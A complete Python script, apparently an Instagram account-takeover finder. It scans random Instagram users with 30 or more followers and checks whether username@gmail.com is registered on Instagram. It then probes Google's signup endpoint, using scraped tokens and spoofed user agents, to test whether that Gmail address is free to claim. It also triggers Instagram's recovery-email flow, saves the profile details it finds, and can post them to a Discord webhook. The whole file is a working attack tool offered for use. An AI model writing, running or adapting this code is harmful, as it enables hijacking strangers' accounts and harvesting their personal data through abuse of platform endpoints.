# ========================================================== #
import os
import re
import json
from time import time
from hashlib import md5
from threading import Thread
from random import randrange, choice

try:
    import requests
    from user_agent import generate_user_agent
except ImportError:
    os.system("pip install requests")
    os.system("pip install user_agent")

    import requests
    from user_agent import generate_user_agent

# ========================================================== #
MIN_FOLLOWERS = 30
THREAD_COUNT = 30

OUTPUT_FILE = "FinderResults.txt"

# ========================================================== #
bad_instas = 0
matches_found = 0
no_gmail_match = 0

# ========================================================== #


class Colors:
    RED = "\033[1;91m"
    GREEN = "\033[1;92m"
    YELLOW = "\033[1;93m"
    BLUE = "\033[1;94m"
    MAGENTA = "\033[1;95m"
    CYAN = "\033[1;96m"
    WHITE = "\033[1;97m"
    RESET = "\033[0m"


# ========================================================== #
def clear_screen():
    os.system("clear" if os.name == "posix" else "cls")


def print_stats(last_checked_email=""):
    clear_screen()
    print(
        f"""
        ___________________________________
        {Colors.GREEN} Matches : [ {matches_found} ] 
        {Colors.RED} Bad Accounts : [ {bad_instas} ] 
        {Colors.YELLOW} Gmail Matches : [ {no_gmail_match} ]

        {Colors.BLUE} Last Checked : [ {last_checked_email} ]
        ___________________________________
        """
    )


def get_google_token():
    try:
        letters = "abcdefghijklmnopqrstuvwxyz"
        n1 = "".join(choice(letters) for _ in range(randrange(6, 9)))
        n2 = "".join(choice(letters) for _ in range(randrange(3, 9)))
        host = "".join(choice(letters) for _ in range(randrange(15, 30)))

        headers = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            "user-agent": generate_user_agent(),
        }

        recovery_page = requests.get(
            "https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin",
            headers=headers,
        )

        token_match = re.search(
            r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            recovery_page.text,
        )

        if not token_match:
            raise Exception("Failed To Extract Token")

        tok = token_match.group(2)

        cookies = {"__Host-GAPS": host}
        headers = {
            "authority": "accounts.google.com",
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            "origin": "https://accounts.google.com",
            "referer": "https://accounts.google.com/signup/v2/createaccount",
            "user-agent": generate_user_agent(),
        }

        data = {
            "f.req": f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            "deviceinfo": '[null,null,null,null,null,"US",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }

        response = requests.post(
            "https://accounts.google.com/_/signup/validatepersonaldetails",
            cookies=cookies,
            headers=headers,
            data=data,
        )

        tl = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict().get("__Host-GAPS", "")

        with open("GoogleToken.txt", "w") as f:
            f.write(f"{tl}//{host}\n")

        return tl, host

    except Exception as e:
        print(f"Error Getting Google Token : {e}")
        return get_google_token()


def check_gmail_exists(username):
    if "@" in username:
        username = str(username).split("@")[0]

    try:
        try:
            with open("GoogleToken.txt", "r") as f:
                token_data = f.read().strip().split("//")
                if len(token_data) != 2:
                    raise Exception("Invalid Token Format")
                tl, host = token_data
        except:
            tl, host = get_google_token()

        cookies = {"__Host-GAPS": host}
        headers = {
            "authority": "accounts.google.com",
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            "origin": "https://accounts.google.com",
            "referer": f"https://accounts.google.com/signup/v2/createusername?TL={tl}",
            "user-agent": generate_user_agent(),
        }

        params = {"TL": tl}

        data = f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&flowEntry=SignUp&service=mail&f.req=%5B%22TL%3A{tl}%22%2C%22{username}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22US%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn"

        response = requests.post(
            "https://accounts.google.com/_/signup/usernameavailability",
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
        )

        if '"gf.uar",1' in str(response.text):
            return True
        elif '"er",null,null,null,null,400' in str(response.text):
            get_google_token()
            return check_gmail_exists(username)
        else:
            return False
    except Exception:
        return check_gmail_exists(username)


def get_recovery_email(username):
    try:
        headers = {
            "X-IG-App-ID": "567067343352427",
            "User-Agent": "Instagram 100.0.0.17.129 Android",
            "Accept-Language": "en-US",
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        }

        data = {
            "signed_body": f'SIGNATURE.{{"query":"{username}"}}',
            "ig_sig_key_version": "4",
        }

        response = requests.post(
            "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/",
            headers=headers,
            data=data,
        ).json()

        return response.get("email", "Not Available")
    except:
        return "Not Available"


def get_instagram_profile(username):
    """Get Details Of An Instagram Profile"""
    global matches_found
    matches_found += 1

    try:
        url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}"

        headers = {
            "accept": "*/*",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "x-ig-app-id": "936619743392459",
        }

        response = requests.get(url, headers=headers).json()
        user_data = response.get("data", {}).get("user", {})

        profile_info = {
            "full_name": user_data.get("full_name", "N/A"),
            "username": username,
            "email": f"{username}@gmail.com",
            "followers": user_data.get("edge_followed_by", {}).get("count", "N/A"),
            "following": user_data.get("edge_follow", {}).get("count", "N/A"),
            "user_id": user_data.get("id", "N/A"),
            "posts": user_data.get("edge_owner_to_timeline_media", {}).get(
                "count", "N/A"
            ),
            "biography": user_data.get("biography", "N/A"),
            "recovery_email": get_recovery_email(username),
        }

        output = f"""
        INSTAGRAM ACCOUNT INFO ~
        ------------------------------------
        NAME: {profile_info['full_name']}
        
        EMAIL: {username}@gmail.com
        RECOVERY EMAIL: {profile_info['recovery_email']}

        USERNAME: @{username}
        
        FOLLOWERS: {profile_info['followers']}
        FOLLOWING: {profile_info['following']}
        
        ID: {profile_info['user_id']}
        BIO: {profile_info['biography']}
        
        POSTS: {profile_info['posts']}
        ------------------------------------
        """
        print(output)

        with open(OUTPUT_FILE, "a") as f:
            f.write(f"{output}\n")

        if config["discord"]["enabled"]:
            webhook_url = config["discord"]["webhook_url"]
            message = {
                "embeds": [
                    {
                        "title": f"Instagram Account Found: @{username}",
                        "description": output,
                        "color": 16711680,
                        "footer": {"text": "Instagram Username Finder"},
                    }
                ]
            }

            response = requests.post(webhook_url, json=message)

            if response.status_code == 204:
                print(f"{Colors.GREEN}Discord Notification Sent!{Colors.RESET}")
            else:
                print(f"{Colors.RED}Failed To Send Discord Notification!{Colors.RESET}")

    except Exception as e:
        print(f"Error Retrieving Profile : {e}")


def check_instagram_account(email):
    """Check If An Instagram Account Exists"""
    global bad_instas, no_gmail_match

    try:
        csrftoken = md5(str(time()).encode()).hexdigest()
        user_agent = generate_user_agent()

        headers = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.instagram.com",
            "referer": "https://www.instagram.com/accounts/signup/email/",
            "user-agent": user_agent,
            "x-csrftoken": csrftoken,
        }

        data = {"email": email}

        response = requests.post(
            "https://www.instagram.com/api/v1/web/accounts/check_email/",
            headers=headers,
            data=data,
        )

        if "email_is_taken" in response.text:
            username = email.split("@")[0]

            if check_gmail_exists(username):
                get_instagram_profile(username)
            else:
                no_gmail_match += 1
        else:
            bad_instas += 1
    except:
        pass

    print_stats(email)


def find_instagram_accounts():
    """Find Instagram Accounts With High Follower Count"""
    while True:
        try:
            id = str(randrange(1900000000, 2100000000))

            lsd = "".join(choice("eQ6xuzk5X8j6_fGvb0gJrc") for _ in range(16))

            headers = {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://www.instagram.com",
                "referer": "https://www.instagram.com/",
                "user-agent": generate_user_agent(),
                "x-fb-lsd": f"token{lsd}",
            }

            data = {
                "lsd": f"token{lsd}",
                "variables": f'{{"id":"{id}","relay_header":false,"render_surface":"PROFILE"}}',
                "doc_id": "7397388303713986",
            }

            response = requests.post(
                "https://www.instagram.com/api/graphql",
                headers=headers,
                data=data,
            )

            response_json = response.json()
            user_data = response_json.get("data", {}).get("user", {})
            username = user_data.get("username")
            follower_count = user_data.get("follower_count", 0)

            if username and follower_count >= MIN_FOLLOWERS:
                email = f"{username}@gmail.com"
                check_instagram_account(email)
        except:
            continue


def save_config(config):
    with open("AccountFinderConfig.json", "w") as f:
        json.dump(config, f, indent=4)


def load_config():
    try:
        with open("AccountFinderConfig.json", "r") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {
            "discord": {"enabled": False, "webhook_url": ""},
        }


if __name__ == "__main__":
    clear_screen()
    print(
        f"\n{Colors.RESET}{Colors.YELLOW}[1/2]  Instagram Account Finder\n  ----------------------\n"
    )

    config = load_config()

    print(
        f"{Colors.RESET}{Colors.YELLOW}[2/2] {Colors.WHITE}Discord Notification Setup :"
    )
    use_discord = (
        input(f"  Enable Discord Notifications? (Y/N) : {Colors.CYAN}").upper() == "Y"
    )

    if use_discord:
        config["discord"]["enabled"] = True

        if config["discord"]["webhook_url"]:
            webhook_prompt = f"  Webhook URL [{config['discord']['webhook_url'][:20]}...]: {Colors.CYAN}"
        else:
            webhook_prompt = f"  Webhook URL: {Colors.CYAN}"

        webhook_url = input(webhook_prompt)
        config["discord"]["webhook_url"] = (
            webhook_url if webhook_url else config["discord"]["webhook_url"]
        )
    else:
        config["discord"]["enabled"] = False

    if config["discord"]["enabled"]:
        print(
            f"{Colors.GREEN}[INFO] {Colors.WHITE}Discord Notifications Enabled!{Colors.RESET}"
        )

    webhook_url = config["discord"]["webhook_url"]

    message = {
        "embeds": [
            {
                "title": "🔔 Discord Notifications Enabled",
                "description": f"Webhook URL: **{webhook_url}**",
                "color": 5763719,
                "footer": {"text": "Instagram Username Finder"},
            }
        ]
    }

    response = requests.post(webhook_url, json=message)

    if response.status_code == 204:
        print(
            f"{Colors.GREEN}[INFO] {Colors.WHITE}Discord Notification Sent Successfully!{Colors.RESET}"
        )

    else:
        print(
            f"{Colors.RED}[ERROR] {Colors.WHITE}Failed To Send Discord Notification!{Colors.RESET}"
        )

    save_config(config)

    print(f"\nStarting Search With {THREAD_COUNT} Threads ...")
    print(f"Results Will Be Saved To {OUTPUT_FILE}\n")

    threads = []
    for _ in range(THREAD_COUNT):
        t = Thread(target=find_instagram_accounts)
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("\nSearch Stopped By User")
        print(f"Found {matches_found} Matches. Results Saved To {OUTPUT_FILE}")
